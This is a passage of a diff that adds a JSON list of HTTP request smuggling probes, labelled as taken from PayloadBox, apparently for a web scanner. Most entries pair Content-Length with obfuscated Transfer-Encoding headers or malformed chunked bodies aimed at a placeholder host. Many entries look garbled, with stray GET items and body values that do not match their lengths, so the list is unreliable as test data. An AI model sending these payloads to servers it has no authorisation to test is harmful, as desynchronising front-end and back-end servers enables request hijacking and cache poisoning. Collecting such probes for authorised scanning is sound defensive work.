+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #54",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /trailing HTTP/1.1",
+    "headers": {
+      "X-Trailing": "tab"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #55",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunk ed"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #56",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /middle HTTP/1.1",
+    "headers": {
+      "X-Middle": "space"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #57",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "c h u n k e d"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #58",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /spaced HTTP/1.1",
+    "headers": {
+      "X-Fully": "spaced"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #59",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked; extension"
+    },
+    "body": "4a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #60",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /extension HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Ext": "param"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #61",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked; foo=bar"
+    },
+    "body": "4c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #62",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /params HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Param": "test"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #63",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked; q=1.0"
+    },
+    "body": "46",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #64",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /quality HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Q": "value"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #65",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x, y, z, chunked"
+    },
+    "body": "48",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #66",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /chain HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Chain": "long"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #67",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "TE": "chunked"
+    },
+    "body": "34",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #68",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /te HTTP/1.1",
+    "headers": {
+      "X-TE": "header"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #69",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "trailers, chunked"
+    },
+    "body": "4a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #70",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /trailers HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Trail": "test"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #71",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked trailers"
+    },
+    "body": "4c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #72",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #73",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /triple HTTP/1.1",
+    "headers": {
+      "X-Triple": "header"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #74",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "y"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #75",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /double HTTP/1.1",
+    "headers": {
+      "X-Double": "test"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #76",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "z"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #77",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /quad HTTP/1.1",
+    "headers": {
+      "X-Quad": "headers"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #78",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "xchunkedx"
+    },
+    "body": "40",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #79",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /wrapped HTTP/1.1",
+    "headers": {
+      "X-Wrapped": "value"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #80",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "ychunked"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #81",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /prefix HTTP/1.1",
+    "headers": {
+      "X-Prefix": "char"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #82",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunkedy"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #83",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /suffix HTTP/1.1",
+    "headers": {
+      "X-Suffix": "char"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #84",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "0chunked"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #85",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /digit HTTP/1.1",
+    "headers": {
+      "X-Digit": "prefix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #86",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked0"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #87",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /digit2 HTTP/1.1",
+    "headers": {
+      "X-Digit": "suffix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #88",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "_chunked"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #89",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /under HTTP/1.1",
+    "headers": {
+      "X-Under": "score"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #90",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked_"
+    },
+    "body": "3e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #91",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /under2 HTTP/1.1",
+    "headers": {
+      "X-Under": "score2"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #92",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "-chunked"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #93",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /dash HTTP/1.1",
+    "headers": {
+      "X-Dash": "prefix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #94",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked-"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #95",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /dash2 HTTP/1.1",
+    "headers": {
+      "X-Dash": "suffix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #96",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": ".chunked"
+    },
+    "body": "38",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #97",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /dot HTTP/1.1",
+    "headers": {
+      "X-Dot": "prefix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #98",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked."
+    },
+    "body": "38",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Te Te Payloads #99",
+    "description": "HTTP Request Smuggling probe from PayloadBox (TE-TE-Payloads.txt). Target request line: GET /dot2 HTTP/1.1",
+    "headers": {
+      "X-Dot": "suffix"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Time Based Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Time-Based-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1\\r\\nA\\r\\nQ",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Time Based Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Time-Based-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "6"
+    },
+    "body": "7\\r\\nTESTING\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Time Based Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Time-Based-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "10",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nDETECTIONEND",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Time Based Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Time-Based-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "12\\r\\nTESTSMUGGLING\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Time-Based-Payloads.txt"
+  }
+]
